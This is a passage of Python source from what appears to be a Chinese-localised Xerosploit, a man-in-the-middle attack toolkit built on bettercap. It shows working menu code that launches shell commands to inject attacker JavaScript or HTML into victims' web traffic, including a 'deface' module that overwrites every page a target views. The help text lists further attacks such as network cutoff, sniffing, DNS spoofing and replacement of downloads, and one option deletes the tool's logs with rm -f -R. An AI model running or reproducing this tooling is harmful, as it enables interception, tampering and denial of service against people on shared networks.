									cmd_inject_j = os.system("xettercap " + target_parse + target_ips + " --proxy-module=injectjs --js-file " + js_file + " -I " + up_interface + " --gateway " + gateway)
									inject_j()
							else:
								print("\033[1;91m\n[!] 错误 : 命令没有被发现.\033[1;m")
								inject_j()

						inject_j()

					elif options == "deface":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                           覆盖网页                           █
█                                                              █
█                      用HTML代码覆盖所有网页                  █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def deface():
							print("\033[1;32m\n[+] 输入 'run' 来执行覆盖网页功能.\n\033[1;m")
							action_deface = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_deface == "back":
								option()
							elif action_deface == "exit":
								sys.exit(exit_msg)	
							elif action_deface == "home":
								home()
							elif action_deface == "run":
								print("\033[1;32m\n[+] 指定一个代码文件 .\033[1;m")
								print("\033[1;33m\n[!] 你的文件不应该包含Javascript代码 .\n\033[1;m")
								
								file_deface = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m")
								
								if file_deface == "back":
									option()
								elif file_deface == "exit":
									sys.exit(exit_msg)	
								elif file_deface == "home":
									home()
								else:
									file_deface = file_deface.replace("'","")
									file_deface  = open(file_deface, 'r').read()
									file_deface = file_deface.replace("\n","")

									print("\033[1;34m\n[++] 覆盖所有网页中 ... \033[1;m")
									print("\033[1;34m\n[++] 按 'Ctrl + C' 来停止. \n\033[1;m")

									
									content = """<script type='text/javascript'> window.onload=function(){document.body.innerHTML = " """ + file_deface + """ ";}</script>"""
									f1 = open('/home/home/xero-html.html','w')
									f1.write(content)
									f1.close()

									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /home/home/xero-html.html -I " + up_interface + " --gateway " + gateway )
									deface()
							else:
								print("\033[1;91m\n[!] 错误 :命令没有被发现.\033[1;m")
								deface()

						deface()

					elif options == "back":
						target_ip()	
					elif options == "exit":
								sys.exit(exit_msg)	
					elif options == "home":
						home()
					# Show disponible modules.
					elif options == "help":
						print ("")
						table_datas = [
		    				["\033[1;36m\n\n\n\n\n\n\n要返回上\n一级菜单\n请用back\n\n\n\n\n功能模块\n输入相应\n的单词来\n运行功能", """
pscan       :  端口扫描

dos         :  断网攻击

ping        :  Ping目标

injecthtml  :  注入HTML代码

injectjs    :  注入JS代码

rdownload   :  替换正在下载的文件

sniff       :  捕获嗅探目标网络通信的信息

dspoof      :  将所有HTTP通信重定向到指定的IP地址

yplay       :  在目标浏览器中播放背景声音

replace     :  用你指定的图片替换目标所有的网页图片

driftnet    :  查看目标正在查看的网络图片

move        :  让目标网页所有的文字震动效果

deface      :  用你写的HTML代码覆盖所有网页\n\033[1;m"""]
						]
						table = DoubleTable(table_datas)
						print(table.table)
						option()
					else:
						print("\033[1;91m\n[!] 错误 : 模块命令没有被发现 . 请输入'help' 来查看模块命令帮助信息. \033[1;m")
						option()
				option()



			if target_ips == "back":
				home()
			elif target_ips == "exit":
								sys.exit(exit_msg)	
			elif target_ips == "home":
				home()
			elif target_ips == "help":
				table_datas = [
		    		["\033[1;36m\n说明\n", "\n请输入上面其中一个要攻击的IP地址.\n要攻击多个目标请用这个样的格式: ip1,ip2,ip3,... \n输入'all' 这个命令将会攻击整个局域网.\n\n\033[1;m"]
				]
				table = DoubleTable(table_datas)
				print(table.table)
				target_ip()
		# if target = all the network
			elif target_ips == "all": 

				target_ips = ""
				target_parse = ""
				target_name = "All your network"
				program0()

			else:
				program0()







		def cmd0():
			while True:
				print("\033[1;32m\n[+] 请输入‘help’来查看功能选项.\n\033[1;m")
				cmd_0 = raw_input("\033[1;36m\033[4mXero\033[0m\033[1;36m ➮ \033[1;m").strip()
				if cmd_0 == "scan": # Map the network
					print("\033[1;34m\n[++] 扫描整个局域网中 ... \n\033[1;m")
					scan()
				elif cmd_0 == "start": # Skip network mapping and directly choose a target.
					target_ip()
				elif cmd_0 == "gateway": # Change gateway
					def gateway():
						print("")
						table_datas = [
			    			["\033[1;36m\n说明\n", "\n手动指定你的网关.\n输入'0' 来选择使用默认网关.\n\033[1;m"]
						]
						table = DoubleTable(table_datas)
						print(table.table)

						print("\033[1;32m\n[+] 输入你的网关.\n\033[1;m")
						n_gateway = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mgateway\033[0m\033[1;36m ➮ \033[1;m").strip()
			
						if n_gateway == "back":
							home()
						elif n_gateway == "exit":
								sys.exit(exit_msg)	
						elif n_gateway == "home":
							home()
						else:

							s_gateway = open('/opt/xerosploit/tools/files/gateway.txt','w')
							s_gateway.write(n_gateway)
							s_gateway.close()

							home()
					gateway()

				elif cmd_0 == "iface": # Change network interface.
					def iface():
						print ("")
						table_datas = [
			    			["\033[1;36m\n说明\n", "\n手动指定你的网卡接口设备.\n输入 '0' 来选择你的默认网络接口.\n\033[1;m"]
						]
						table = DoubleTable(table_datas)
						print(table.table)

						print("\033[1;32m\n[+] 输入你的网卡接口设备.\n\033[1;m")
						n_up_interface = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4miface\033[0m\033[1;36m ➮ \033[1;m").strip()

						if n_up_interface == "back":
							home()
						elif n_up_interface == "exit":
								sys.exit(exit_msg)	
						elif n_up_interface == "home":
							home()
						else:
							s_up_interface = open('/opt/xerosploit/tools/files/iface.txt','w')
							s_up_interface.write(n_up_interface)
							s_up_interface.close()

							home()
					iface()		
				elif cmd_0 == "exit":
					sys.exit(exit_msg)

				elif cmd_0 == "home":
					home()

				elif cmd_0 == "rmlog": # Remove all logs
					def rm_log():
						print("\033[1;32m\n[+] 想要删除所有的日志文件吗 ? (y/n)\n\033[1;m")
						cmd_rmlog = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mrmlog\033[0m\033[1;36m ➮ \033[1;m").strip()
						if cmd_rmlog == "y":
							rmlog = os.system("rm -f -R /opt/xerosploit/xerosniff/ /opt/xerosploit/tools/log/* /opt/xerosploit/tools/bettercap/modules/tmp/* /opt/xerosploit/tools/files/dns.conf")
							print("\033[1;31m\n[++] 所有的日志文件已经被删除了. \n\033[1;m")
							sleep(1)
							home()
						elif cmd_rmlog == "n":
							home()
						
						elif cmd_rmlog == "exit":
							sys.exit(exit_msg)

						elif cmd_rmlog == "home":
							home()
						elif cmd_rmlog == "back":
							home()
						else:
							print("\033[1;91m\n[!] 错误 : 命令没有被发现. 请输入 'y' 或者 'n'\033[1;m")
							rm_log()
					rm_log()	
# Principal commands
				elif cmd_0 == "help":
					print ("")
					table_datas = [
			    		["\033[1;36m\n\n\n\n命令模块\n输入相应\n的单词来\n运行功能", """
scan     :  扫描整个局域网并列出所有设备信息.

iface    :  手动设置网卡接口.

gateway  :  手动设置你的网关.

start    :  跳过扫描并直接设置目标IP地址.

rmlog    :  删除所有的日志文件.

help     :  显示帮助信息.

exit     :  关闭 Xerosploit.\n\033[1;m"""]
					]
					table = DoubleTable(table_datas)
					print(table.table)


				else:
					print("\033[1;91m\n[!] 错误 : 命令没有被发现.\033[1;m")


		home()			
		cmd0()


	except KeyboardInterrupt:
		print ("\n" + exit_msg)
		sleep(1)
	except Exception:
		traceback.print_exc(file=sys.stdout)
	sys.exit(0)

if __name__ == "__main__":
	main()
